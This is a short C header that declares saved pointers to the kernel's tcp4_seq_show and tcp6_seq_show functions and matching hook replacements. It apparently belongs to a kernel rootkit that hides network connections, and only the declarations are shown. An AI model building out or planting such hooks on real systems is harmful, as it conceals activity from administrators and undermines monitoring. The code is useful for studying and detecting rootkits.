extern long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
extern long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

long hook_tcp4_seq_show(struct seq_file *seq, void *v);
long hook_tcp6_seq_show(struct seq_file *seq, void *v);
